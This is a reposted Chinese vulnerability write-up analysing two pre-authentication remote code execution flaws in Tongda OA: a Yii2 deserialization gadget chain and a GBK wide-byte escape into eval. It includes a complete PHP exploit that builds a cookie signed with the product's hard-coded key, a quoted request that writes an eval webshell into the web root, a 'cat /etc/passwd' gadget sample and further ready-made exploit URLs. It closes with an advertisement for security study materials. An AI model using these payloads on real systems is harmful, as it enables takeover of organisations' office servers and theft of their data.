# 转载
：  通达OA RCE远程代码执行漏洞分析

# 通达OA RCE远程代码执行漏洞分析

**目录**

[1. 前台反序列化漏洞](#1.%20%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E)

[前言](#%E5%89%8D%E8%A8%80)

[确定yii版本](#%E7%A1%AE%E5%AE%9Ayii%E7%89%88%E6%9C%AC)

[反序列化链的审计](#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%9A%84%E5%AE%A1%E8%AE%A1)

[poc](#poc)

[2. 前台代码注入漏洞](#2.%20%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)

[前言](#%E5%89%8D%E8%A8%80)

[对poc的简要分析与猜测](#%E5%AF%B9poc%E7%9A%84%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90%E4%B8%8E%E7%8C%9C%E6%B5%8B)

[源码分析](#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90)

[寻找其它的利用处](#%E5%AF%BB%E6%89%BE%E5%85%B6%E5%AE%83%E7%9A%84%E5%88%A9%E7%94%A8%E5%A4%84)

[其它可以利用的组件模块](#%E5%85%B6%E5%AE%83%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E7%BB%84%E4%BB%B6%E6%A8%A1%E5%9D%97)

[其它可以利用的路由](#%E5%85%B6%E5%AE%83%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E8%B7%AF%E7%94%B1)

[参考文章](#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0)

---


#### 1. 前台反序列化漏洞

##### 前言

由于已经有师傅对于如何触发反序列化的方法和代码进行了说明，这里我也就不拾人牙慧，主要谈一谈这里反序列化链的挖掘。具体的触发流程可以参考[https://mp.weixin.qq.com/s/nOQuqt\_mO0glY-KALc1Xiw](https://mp.weixin.qq.com/s/nOQuqt%5C_mO0glY-KALc1Xiw)<br/> 目前网上也出现了一些分析反序列化链的分析，但是目前我看到的大部分分析走的反序列化链都是通达OA自己实现了一个redis的Connection类进行攻击的poc。但是这个链，我个人认为是不够完善的。因为首先这个链设计到了socket的连接问题，可能会有一定的不稳定性和延迟。其次这条链的序列化数据比较长。那么能不能通过yii2框架的自带的链子进行更加稳定的反序列化链的触发呢。先说答案可以，并且GitHub上也已经有了链子的构造。下面进行整条链子的分析流程分享。

##### 确定yii版本

首先通过参考师傅的审计思路，我们可以发现这里的yii2是2.0.13-dev。

<br/> 看到是yii2的时候我就想着去偷个懒，毕竟这个框架之前爆出了很多反序列化的问题，到网上搜了一圈poc，发现没一个能打通的。这里我发现了一个问题，网上的poc基本上如下：

```
&lt;?php
namespace Faker{

    class DefaultGenerator{
        protected $default ;
        function __construct($argv)
        {
            $this-&gt;default = $argv;
        }
    }

    class ValidGenerator{
        protected $generator;
        protected $validator;
        protected $maxRetries;
        function __construct($command,$argv)
        {
            $this-&gt;generator = new DefaultGenerator($argv);
            $this-&gt;validator = $command;
            $this-&gt;maxRetries = 99999999;
        }
    }
}

namespace Codeception\Extension{
    use Faker\ValidGenerator;
    class RunProcess{
        private $processes = [] ;
        function __construct($command,$argv)
        {
            $this-&gt;processes[] = new ValidGenerator($command,$argv);
        }
    }
}

namespace {
    use Codeception\Extension\RunProcess;
    $exp = new RunProcess('system','cat /etc/passwd');
    echo(base64_encode(serialize($exp)));
    exit();
}

```

在这里我们会发现一个问题，就是基本上都用到了Faker的这个namespace下的类，但是在yii2的核心框架不含任何拓展的情况下这个命名空间的相关文件是没有的。所以基本上网上的poc全部都失效了。这边就需要我们自己去挖掘一条yii2的反序列化链。去GitHub上下载了对应的yii2的版本，由于没发现标签是yii2.0.13-dev的这个版本，所以就下载了yii2.0.13的最新的一个版本。

##### 反序列化链的审计

老规矩，在没有后续操作下的反序列化的可利用的起始魔术方法基本上是__destruct，yii2也很简单明了，也就只有一个类含有__destruct

<br/> 在BatchQueryResult类中的__destruct作为反序列化的起点，这个也和网上大多数的链子的起点一样。往下走，可以看到__destruct中调用了reset，而reset函数中则出现了反序列化中很喜欢遇到的一个写法。

```
$this-&gt;_dataReader-&gt;close();

```

这个写法有两种利用的跳转方式，调用其它类的close方法或者调用其它未实现close方法的类的__call方法。这里我一开始的想法是跟进了__call方法，因为很多时候__call方法中都会采用call_user_func的形式进行调用，很有可能存在代码执行。但是这里也发现了问题，唯一一个调用了call_user**func，而不是没有其它任何操作的，直接抛出错误的是yii\base\Component的\**_call方法长这样。

```
    public function __call($name, $params)
    {
        $this-&gt;ensureBehaviors();
        foreach ($this-&gt;_behaviors as $object) {
            if ($object-&gt;hasMethod($name)) {
                return call_user_func_array([$object, $name], $params);
            }
        }
        throw new UnknownMethodException('Calling unknown method: ' . get_class($this) . "::$name()");
    }

```

这明摆着也只能调用其它类的close方法，所以下一步就是查看别的类的close方法是不是可以有可以利用的地方。

一开始进行审计的是yii\db\Connection类中的close，因为这个close方法中可以触发__get和__tostring的魔术方法

```
    public function close()
    {
        if ($this-&gt;_master) {
            if ($this-&gt;pdo === $this-&gt;_master-&gt;pdo) {
                $this-&gt;pdo = null;
            }

            $this-&gt;_master-&gt;close();
            $this-&gt;_master = false;
        }

        if ($this-&gt;pdo !== null) {
            Yii::trace('Closing DB connection: ' . $this-&gt;dsn, __METHOD__);
            $this-&gt;pdo = null;
            $this-&gt;_schema = null;
            $this-&gt;_transaction = null;
        }

        if ($this-&gt;_slave) {
            $this-&gt;_slave-&gt;close();
            $this-&gt;_slave = false;
        }
    }

```

但是再对__get的方法进行阅读后，发现暂时没有能进一步利用的点，于是对__toString方法进行审计。这里我一开始是没有发现可以继续利用的地方。但是后来在PHPGGC的gadget中发现了yii2的相应反序列化链，同时在群里师傅的帮助下，弄明白了这条链的触发逻辑。

这里首先是从触发yii\db\cubrid\ColumnSchemaBuilder的__toString入手。

```
    public function __toString()
    {
        switch ($this-&gt;getTypeCategory()) {
            case self::CATEGORY_PK:
                $format = '{type}{check}{comment}{append}{pos}';
                break;
            case self::CATEGORY_NUMERIC:
                $format = '{type}{length}{unsigned}{notnull}{unique}{default}{check}{comment}{append}{pos}';
                break;
            default:
                $format = '{type}{length}{notnull}{unique}{default}{check}{comment}{append}{pos}';
        }

        return $this-&gt;buildCompleteString($format);
    }
        protected function getTypeCategory()
    {
        return isset($this-&gt;categoryMap[$this-&gt;type]) ? $this-&gt;categoryMap[$this-&gt;type] : null;
    }

```

我们可以发现这里上来是调用了getTypeCategory，而getTypeCategory中则对categoryMap进行了类似数组的方式取值。这里也是我一开始忽略的点，我上来觉得这个可能就最多能触__get方法，但是__get方法又正如前面所说的找不到特别好的触发地方。但是这里其实是我基础知识不过关导致的，要将类作为数组的方式取值，是要实现特定接口才行，而非某种魔术方法。在php的文档中，我们可以发现ArrayAccess正是需要被实现的接口。

<br/> 在yii2的框架中有个ArrayCache的类继承自Cache，而Cache类则有对ArrayAccess接口进行实现。

我们可以发现这里上来是调用了getTypeCategory，而getTypeCategory中则对categoryMap进行了类似数组的方式取值。这里也是我一开始忽略的点，我上来觉得这个可能就最多能触__get方法，但是__get方法又正如前面所说的找不到特别好的触发地方。但是这里其实是我基础知识不过关导致的，要将类作为数组的方式取值，是要实现特定接口才行，而非某种魔术方法。在php的文档中，我们可以发现ArrayAccess正是需要被实现的接口。

在yii2的框架中有个ArrayCache的类继承自Cache，而Cache类则有对ArrayAccess接口进行实现。

再看Cache类中对offsetGet的实现

```
    public function offsetGet($key)
    {
        return $this-&gt;get($key);
    }
    public function get($key)
    {
        $key = $this-&gt;buildKey($key);
        $value = $this-&gt;getValue($key);
        if ($value === false || $this-&gt;serializer === false) {
            return $value;
        } elseif ($this-&gt;serializer === null) {
            $value = unserialize($value);
        } else {
            $value = call_user_func($this-&gt;serializer[1], $value);
        }
        if (is_array($value) &amp;&amp; !($value[1] instanceof Dependency &amp;&amp; $value[1]-&gt;isChanged($this))) {
            return $value[0];
        }

        return false;
    }
    public function buildKey($key)
    {
        if (is_string($key)) {
            $key = ctype_alnum($key) &amp;&amp; StringHelper::byteLength($key) &lt;= 32 ? $key : md5($key);
        } else {
            $key = md5(json_encode($key));
        }

        return $this-&gt;keyPrefix . $key;
    }
    protected function getValue($key)
    {
        if (isset($this-&gt;_cache[$key]) &amp;&amp; ($this-&gt;_cache[$key][1] === 0 || $this-&gt;_cache[$key][1] &gt; microtime(true))) {
            return $this-&gt;_cache[$key][0];
        }

        return false;
    }

```

这里可以看到有call_user_func的调用，get的参数$key的值是由getTypeCategory中的$this-&gt;type提供的，这个是完全可控的，而buildKey对于全是字母数字的长度32以下的则不做任何修改。getValue中的$this-&gt;_cache也是完全可控的，所以这也就说明get函数中的$value可控，并且在call_user_func中的$this-&gt;serializer也是在反序列化的时候完全可控，这样这里的call_user_func就导致了任意代码执行。由于目标是通达OA，php版本为php5，这里用$this-&gt;serializer赋值为assert就可以类似eval的进行任意代码执行。

##### poc

下面是完整的poc

```
&lt;?php
//仅用于安全研究与授权测试，使用此漏洞造成的任何攻击影响均与本文作者无关。
namespace yii\db {
    class ColumnSchemaBuilder {
        protected $type = 'x';
        public $categoryMap;

        function __construct($categoryMap) {
            $this-&gt;categoryMap = $categoryMap;
        }
    }

    class Connection {
        public $pdo = 1;

        function __construct($dsn) {
            $this-&gt;dsn = $dsn;
        }
    }

    class BatchQueryResult {
        private $_dataReader;

        function __construct($dataReader) {
            $this-&gt;_dataReader = $dataReader;
        }
    }
}

namespace yii\caching {
    class ArrayCache {
        public $serializer;
        private $_cache;

        function __construct($function, $parameter) {
            $this-&gt;serializer = [1 =&gt; $function];
            $this-&gt;_cache = ['x' =&gt; [$parameter, 0]];
        }
    }
}
namespace{
    $function = 'var_dump';
    $parameter = 123;

    $cache = new \yii\caching\ArrayCache($function, $parameter);
    $csb = new \yii\db\ColumnSchemaBuilder($cache);
    $conn = new \yii\db\Connection($csb);
    $query = new \yii\db\BatchQueryResult($conn);
    $data=(serialize($query));
    $data=hash_hmac('sha256', $data, 'tdide2').$data; //通达OA的cookie反序列化校验
    echo urlencode($data);
}

```

#### 2. 前台代码注入漏洞

##### 前言

在一次众测中，遇到了一个通达OA11，虽然到最后也没有成功拿下权限，但是网上查找到的一个通达OA的前台RCE的poc，让我产生了兴趣，并进行了深入的分析。poc的来源是[漏洞利用-通达OA11.10前台getshell执行命令-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2200049) 。

##### 对poc的简要分析与猜测

网上给出的POC如下：

```
GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%e5',1%3d&gt;fwrite(fopen("D:\MYOA\webroot\general\test1.php","w"),"&lt;?php @eval(next(getallheaders()));"))%3b/*&amp;id=19&amp;module=Carouselimage HTTP/1.1
Host: 192.168.121.147:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=7n7nl11mo8hrkp03hvtj8sjti0; KEY_RANDOMDATA=5711
Upgrade-Insecure-Requests: 1

```

然后文章给出的返回包是这样的

<br/> 注意activeTab那一栏的对应的像乱码一样的中文，再结合poc中这个很像是宽字节注入中出现的%e5，会很让人联想到是不是这一栏带入了sql进行了数据查询，从而导致了sql注入最终由于视图渲染等原因导致了任意代码执行。但是仔细思考后也觉得不对，因为即使是宽字节的注入，这边虽然进行了逃逸，但是也未对后续内容进行闭合和也没有对数据添加单引号表示为字符串。而且在本地进行测试的时候，也发现了这一步就是在控制器中达成的代码执行和视图关系不大。

##### 源码分析

由于这个poc实在没法一眼看出来漏洞的出处，下面对源码进行分析。首先先看一下目录结构

<br/> 可以确定是MVC架构无疑了。

<br/> index.php可以发现使用的是yii2的框架。由于我们分析的是前台RCE，所以先看鉴权，即我们能访问到的路由。

```
    else {
        $url = $_SERVER["REQUEST_URI"];
        $strurl = substr($url, 0, strpos($url, "?"));

        if (strpos($strurl, "/portal/") !== false) {
            if (strpos($strurl, "/gateway/") === false) {
                header("Location:/index.php");
                sess_close();
                exit();
            }
            else if (strpos($strurl, "/gateway/saveportal") !== false) {
                header("Location:/index.php");
                sess_close();
                exit();
            }
            else if (strpos($url, "edit") !== false) {
                header("Location:/index.php");
                sess_close();
                exit();
            }
            else if (strpos($url, "uploadfile") !== false) {
                header("Location:/index.php");
                sess_close();
                exit();
            }
            else if (strpos($url, "uploadportalfile") !== false) {
                header("Location:/index.php");
                sess_close();
                exit();
            }
            else if (strpos($url, "uploadpicture") !== false) {
                header("Location:/index.php");
                sess_close();
                exit();
            }
            else if (strpos($url, "dologin") !== false) {
                header("Location:/index.php");
                sess_close();
                exit();
            }
        }
        else if (strpos($url, "/appdata/doprint") !== false) {
            $_GET["csrf"] = urldecode($_GET["csrf"]);
            $b_check_csrf = false;
            if (!empty($_GET["csrf"]) &amp;&amp; preg_match("/^\{([0-9A-Z]|-){36}\}$/", $_GET["csrf"])) {
                $s_tmp = __DIR__ . "/../../../../logs/appbuilder/logs";
                $s_tmp .= "/" . $_GET["csrf"];

                if (file_exists($s_tmp)) {
                    $b_check_csrf = true;
                    $b_dir_priv = true;
                }
            }

            if (!$b_check_csrf) {
                header("Location:/index.php");
                sess_close();
                exit();
            }
        }
        else {
            header("Location:/index.php");
            sess_close();
            exit();
        }
    }

```

有两个路由的分支，一个是portal，另一个是/appdata/doprint。

/appdata/doprint要访问的话需要/appbuilder/logs底下存在一个类似guid的文件，先来看看这个文件的生成可不可以未授权，发现这个文件的写入控制是在general\appbuilder\modules\appcenter\views\Appdata\print.php文件，访问发现：

<br/> 尝试了一下常规的bypass无果，后来查看nginx.conf，发现该目录已被屏蔽，虽然这种路由的写法理论上是可以进行大小写绕过访问的，但是不清楚为什么即使用了大小写仍然出现了403。

```
        location  ^~ /general/appbuilder/modules/ {
            deny all;
        }

```

即使删掉这项进行访问也会因为被前面的规则卡住，从而引发访问路由不存在的问题。不过这里倒是可以采用大小写进行绕过并成功访问到print.php。

```
        location /general/appbuilder/ {
            index  index.php index.html index.htm;
            try_files $uri $uri/ @rewrite;
            rewrite ^/general/appbuilder/(.*)$ /general/appbuilder/web/index.php?$args;
        }

```

而且再看print.php访问时由于需要一个对象，而这是无法提供的，所以会报错500，无法进行文件的写入生成，综上，这个路由是无法利用的。

继续对上面的路由访问控制进行分析，可以发现首先要求的控制器是portal下的gateway，可能会有人问到这边是否能通过url编码啥的进行绕过，但是在文件的开头就用正则表达式对路由进行了过滤，所以也是不存在绕过的。

```
if (!preg_match("/^(\/[A-Za-z0-9|-]+[\/]?)+(\?[\s\S]*)?$/", $_SERVER["REQUEST_URI"])) {
    echo "请求路径不符合要求";
    exit();
}

```

geteway控制器下一共有19个可访问的action，去除类似login和上面鉴权的模块，可访问到的路由如下：

```
actionGetassembly
actionGetcustomcolumn
actionGetportal
actionPagerelation
actionPages
actionGetpage
actionGetdata
actionGetclassifydata
actionGetpicturelist
actionGetpicturesrc
actionGetlogin
actionDetailspage
actionMore
actionGetworksize

```

去除500，用yii2框架进行sql查询不可能存在sql注入，和没有参数传入无法利用的路由，发现actionGetdata和actionMore存在漏洞的可能性是最大的，正好这次rce的问题也出在了actionGetdata上面，我们来跟进actionGetdata进入深入查看。

跟着poc进行分析，会进入到该action的下例代码中，因为这里的module给的是Carouselimage

```
                $component = new modules\portal\models\PortalComponent();
                $this-&gt;dataBack = $component-&gt;GetData($id, $module, $activeTab, $curnum, $pagelimit, $timetype, 1, $starttime, $endtime, $view);
                $this-&gt;dataBack = modules\appdesign\models\AppUtils::toUTF8($this-&gt;dataBack);
                $redis_data["data"] = modules\portal\controllers\json_encode($this-&gt;dataBack);
                $redis-&gt;hmset("portal:portal_" . $portal_id . ":component_id:" . $id, $redis_data);
                $redis-&gt;expire("portal:portal_" . $portal_id . ":component_id:" . $id, 2592000);
                return $this-&gt;dataBack;

```

从这里开始，我们要开始关注最终导致任意代码执行的activeTab参数，目前activeTab的值未进行任何修改

跟进PortalComponent的的Getdata函数进行查看

```
    public function GetData($id, $module, $activeTab, $curnum, $pagelimit, $timetype, $onepage, $starttime, $endtime, $view, $keyword)
    {
        $data = self::findOne(array("id" =&gt; $id));

        if (modules\portal\models\is_object($data)) {
            $source = $data-&gt;source;
            $attribute = $data-&gt;attribute;
            $comtype = (string) $data-&gt;comtype;
            $open_mode = $data-&gt;open_mode;
            $oaname = $data-&gt;oaname;
            $custom_json = $data-&gt;custom_json;
            $rss_link = $data-&gt;rss_link;
            $link = $data-&gt;link;
            $catidstr = $data-&gt;catidstr;
            $mid = $data-&gt;mid;
            $rets = modules\portal\models\PortalWorkbench::findOne(array("id" =&gt; $mid));

            if (modules\portal\models\is_object($rets)) {
                $type = $rets-&gt;type;
            }

            $this_array = array("id" =&gt; $id, "source" =&gt; $source, "attribute" =&gt; $attribute, "comtype" =&gt; $comtype, "open_mode" =&gt; $open_mode, "oaname" =&gt; $oaname, "custom_json" =&gt; $custom_json, "rss_link" =&gt; $rss_link, "link" =&gt; $link, "catidstr" =&gt; $catidstr, "activeTab" =&gt; $activeTab, "curnum" =&gt; $curnum, "pagelimit" =&gt; modules\portal\models\intval($pagelimit), "timetype" =&gt; $timetype, "type" =&gt; $type, "onepage" =&gt; $onepage, "starttime" =&gt; $starttime, "endtime" =&gt; $endtime, "view" =&gt; $view, "mid" =&gt; $mid, "keyword" =&gt; $keyword);

            if ($source == "custom_link") {
                $url = array("url" =&gt; $link);
                $data = array("page_total" =&gt; "", "total_nums" =&gt; "", "curnum" =&gt; "", "pagelimit" =&gt; "", "open_mode" =&gt; $open_mode, "activeTab" =&gt; $activeTab, "data_sources" =&gt; $source, "data" =&gt; $url);
            }
            else {
                if (!$rss_link &amp;&amp; ($source == "rss_data")) {
                    return array("status" =&gt; 0, "msg" =&gt; "rss地址不可为空");
                }

                $data = Yii::$app-&gt;getModule("portal")-&gt;designComponent-&gt;data_analysis($module, $this_array);
            }
        }
        else {
            return modules\appdesign\models\AppUtils::error(modules\portal\models\_("组件数据为空"));
        }

```

首先先对id进行了查询，由于这是个mvc框架所以，在mysql中对应的数据表就是该类的类名，去数据库中看下poc中的id为19所对应的内容

<br/> 由于source不是custom_link，所以直接进入后续的data_analysis函数。

该函数对comtype进行了判断，并执行了相应module的get_data函数

```
    public function data_analysis($module, $thisarray)
    {
        $classname = $module;
        $classname = "App" . modules\portal\components\ucfirst($classname);

        if ($thisarray["comtype"] == "0") {
            $class = "\app\modules\portal\models\\function_components\\" . $classname;
            $obj = new $class();
            $ret = $obj-&gt;get_data($thisarray);
        }
        else if ($thisarray["comtype"] == "1") {
            $class = "\app\modules\portal\models\\free_components\\" . $classname;
            $obj = new $class();
            $ret = $obj-&gt;get_data($thisarray);
        }
        else if ($thisarray["comtype"] == "2") {
            $class = "\app\modules\portal\models\website_components\\" . $classname;
            $obj = new $class();
            $ret = $obj-&gt;get_data($thisarray);
        }

        return $ret;
    }

```

注意到我们调用的Carouselimage是位于AppCarouselimage.php，而该文件是在free_components下面，所以这里的comtype是1，事实上在数据库中也确实这样。其实这里我们也就发现了，只要id对应的source不是custom_link，然后对应的comtype为1，都能走到poc需要类的get_data，下面对Carouselimage中的get_data进行分析。

```
    public function get_data($thisarray)
    {
        $source = $thisarray["source"];
        $id = $thisarray["id"];
        $portal_id = modules\portal\models\PortalComponent::GetPortalbyComponent($id);
        $thisarray["portal_id"] = $portal_id;

        if ($source == "serv_data") {
            $this-&gt;dataBack = $this-&gt;get_serv_data($thisarray);
        }
        else if ($source == "cot_manage") {
            $this-&gt;dataBack = $this-&gt;get_cot_manage($thisarray);
        }
        else if ($source == "custom_page") {
        }
        else if ($source == "custom_col") {
            $this-&gt;dataBack = $this-&gt;get_custom_col($thisarray);
        }
        else if ($source == "custom_link") {
        }
        else if ($source == "rss_data") {
        }

        $this-&gt;dataBack["data_sources"] = ($thisarray["source"] ? $thisarray["source"] : "");
        return $this-&gt;dataBack;
    }

    public function get_serv_data($thisarray)
    {
        include_once "inc/utility_file.php";
        .........
        .........
        .........
        $dataBacks = array("page_total" =&gt; $page_total, "total_nums" =&gt; $total_nums, "curnum" =&gt; $curnum, "pagelimit" =&gt; $pagelimit, "open_mode" =&gt; (string) $open_mode, "activeTab" =&gt; $activeTab, "show_title" =&gt; $json_data["show_title"], "show_dots" =&gt; $json_data["show_dots"], "speed" =&gt; $json_data["speed"], "data" =&gt; $this-&gt;dataBack);
        return $dataBacks;
    }


```

在这边注意到，其中的activeTab也从来没被修改过。在往后继续，跟进返回到gateway控制器中的actionGetdata，注意到了之后的这行代码：

```
$this-&gt;dataBack = modules\appdesign\models\AppUtils::toUTF8($this-&gt;dataBack);

```

toUTF8的代码如下：

```
    static public function toUTF8($value, $b_force)
    {
        if (yii::$app-&gt;params["UTF8"] &amp;&amp; !$b_force) {
            return $value;
        }

        if (modules\appdesign\models\is_array($value)) {
            if (yii::$app-&gt;params["QuickConvertCharset"]) {
                try {
                    if (!isset($value["pattern"])) {
                        $s_conv = modules\appdesign\models\iconv("GBK", "UTF-8", modules\appdesign\models\var_export($value, modules\appdesign\models\true) . ";");

                        if ($s_conv) {
                            return eval "return " . $s_conv;
                        }
                    }
                }
                catch (yii\base\Exception $e) {
                }
            }

            $arr = array();

            foreach ($value as $k =&gt; $v ) {
                $arr[self::toUTF8($k, $b_force)] = self::toUTF8($v, $b_force);
            }

            return $arr;
        }
        else {
            $s_code = modules\appdesign\models\mb_detect_encoding($value, array("ASCII", "GB2312", "GBK", "UTF-8"), modules\appdesign\models\true);

            if (modules\appdesign\models\in_array($s_code, array("CP936", "GBK", "GB2312", "EUC-CN"))) {
                return modules\appdesign\models\iconv("GBK", "UTF-8", $value);
            }
            else {
                return $value;
            }
        }
    }

```

若想达成代码执行，则需要触发之中的eval，很幸运在默认的配置下是可以走到eval的，这里用了iconv函数将GBK转为UTF8，问题也就出在这里。錦的utf-8编码是0xe98ca6，它的gbk编码是0xe55c。传入的%e5与用来转义的单引号的\，正好组成了这个汉字，从而导致我们的单引号逃逸出来，最终到达eval的任意代码执行。这也由于var_export是用单引号包裹字符串的。下面是本地的一个测试：

```
&lt;?php
$value=array("page_total"=&gt;null,"total_nums"=&gt;null,"curnum"=&gt;1,
"pagelimit"=&gt;10,"open_mode"=&gt;"0","activeTab"=&gt;urldecode("%e5\%27.var_dump(11111));?&gt;"),
"show_title"=&gt;null,"show_dots"=&gt;null,"speed"=&gt;null,"data"=&gt;[],"showPages"=&gt;0,"data_sources"=&gt;"serv_data");
$b=var_export($value, true);
var_dump($b);
$s_conv=iconv("GBK", "UTF-8",  $b.";");
if ($s_conv) {
    var_dump($s_conv);
    eval("return " . $s_conv);
}


```

结果如下：

```
string(310) "array (
  'page_total' =&gt; NULL,
  'total_nums' =&gt; NULL,
  'curnum' =&gt; 1,
  'pagelimit' =&gt; 10,
  'open_mode' =&gt; '0',
  'activeTab' =&gt; '\\\'.var_dump(11111));?&gt;',
  'show_title' =&gt; NULL,
  'show_dots' =&gt; NULL,
  'speed' =&gt; NULL,
  'data' =&gt;
  array (
  ),
  'showPages' =&gt; 0,
  'data_sources' =&gt; 'serv_data',
)"
string(312) "array (
  'page_total' =&gt; NULL,
  'total_nums' =&gt; NULL,
  'curnum' =&gt; 1,
  'pagelimit' =&gt; 10,
  'open_mode' =&gt; '0',
  'activeTab' =&gt; '錦\\'.var_dump(11111));?&gt;',
  'show_title' =&gt; NULL,
  'show_dots' =&gt; NULL,
  'speed' =&gt; NULL,
  'data' =&gt;
  array (
  ),
  'showPages' =&gt; 0,
  'data_sources' =&gt; 'serv_data',
);"
int(11111)

```

可以看到成功进行了逃逸。至此通达OA前台RCE的原理也就分析完了。

##### 寻找其它的利用处

###### 其它可以利用的组件模块

在上面的源码分析，我们也发现了只要最终调用的module中的get_data的返回含有我们可控的activeTab，就可以在/general/appbuilder/web/portal/gateway/getdata进行rce。在comtype为0的情况下，寻找的是文件夹function_components下面的类，其中有一个APPZhidao类，它的get_data如下：

```
    public function get_data($thisarray)
    {
        $json = $thisarray["attribute"];
        $activeTab = $thisarray["activeTab"];
        $curnum = $thisarray["curnum"];
        $pagelimit = $thisarray["pagelimit"];
        $timetype = $thisarray["timetype"];
        $ret = (array) modules\portal\models\function_components\json_decode($json);
        $json_data = modules\appdesign\models\AppUtils::object2Array($ret);
        $json_data = modules\appdesign\models\AppUtils::toGBK($json_data);

        if ($timetype) {
            $this_time = modules\appdesign\models\AppUtils::get_time($timetype);
            $this-&gt;beginTime = $this_time["beginTime"];
            $this-&gt;endTime = $this_time["endTime"];
        }

        $curnum = ($curnum ? $curnum : 1);
        $start = ($curnum - 1) * $pagelimit;

        if (modules\portal\models\function_components\find_id($_SESSION["LOGIN_FUNC_STR"], "185")) {
            .........
            .........
            .........
        }

        $dataBacks = array("page_total" =&gt; $page_total, "total_nums" =&gt; $total_nums, "curnum" =&gt; $curnum, "pagelimit" =&gt; $pagelimit, "activeTab" =&gt; $activeTab, "data" =&gt; $this-&gt;dataBack);
        return $dataBacks;
    }

```

由于未登录所以大部分的逻辑都是不会进去的，直接返回了含有未修改activeTab的数组。利用的poc如下所示：

```
/general/appbuilder/web/portal/gateway/getdata?activeTab=%e5'.var_dump(111));/*&amp;id=1&amp;module=Zhidao

```

其实大部分的组件都是可以利用的，除了website_components下的module，因为它的get_data并没有返回可控的activeTab。

###### 其它可以利用的路由

在actionMore中用到了同样的逻辑来获得dataBack，所以这边也存在利用点，actionMore代码如下：

```
    public function actionMore($id, $module, $activeTab, $curnum, $pagelimit, $keyword)
    {
        Yii::$app-&gt;response-&gt;format = yii\web\Response::FORMAT_JSON;
        $id = modules\portal\controllers\intval($id);
        $curnum = modules\portal\controllers\intval($curnum);
        $pagelimit = modules\portal\controllers\intval($pagelimit);
        $keyword = modules\portal\controllers\td_filterWords($keyword);

        if (empty($id)) {
            return modules\appdesign\models\AppUtils::error(modules\portal\controllers\_("未指定门户组件"));
        }

        $component = new modules\portal\models\PortalComponent();
        $timetype = "";

        if (!$module) {
            $component = modules\portal\models\PortalComponent::find()-&gt;where(array("id" =&gt; $id))-&gt;one();
            $module = $component-&gt;alias;
        }

        $activeTab = ($activeTab ? $activeTab : "");

        if ($module == "video") {
            $activeTab = "More";
        }

        $data = $component-&gt;GetData($id, $module, $activeTab, $curnum, $pagelimit, $timetype, "", "", "", "", $keyword);
        $dataBacks = array("status" =&gt; 1, "data" =&gt; $data);
        $this-&gt;dataBack = modules\appdesign\models\AppUtils::toUTF8($dataBacks);
        return $this-&gt;dataBack;
    }

```

但是需要注意到这边的dataBacks又用了一层array来包裹，所以在做括号闭合时，要多加一层括号，poc如下：

```
/general/appbuilder/web/portal/gateway/more?activeTab=%e5'.var_dump(111)));/*&amp;id=1&amp;module=Zhidao

```

#### 参考文章

[漏洞利用-通达OA11.10前台getshell执行命令-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2200049)

[如何深度分析宽字节sql注入 • Worktile社区](https://worktile.com/kb/p/27611)

[【新】通达OA前台反序列化漏洞分析](https://mp.weixin.qq.com/s/nOQuqt_mO0glY-KALc1Xiw)

```
原文链接：https://forum.butian.net/share/2543
```

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/a624f3e084f8494eb8373a28e8e7f54b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/b41ffcb6824f44e59df0963374ee888c.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/5146f2ea0fab406392511b482b2642af.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/ae39a9bc23f0487daf3fdbdbae77755e.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/d211bc5f4e854950a3a3b3159d93c4ef.png" width="665"/>

应急响应笔记

学习路线
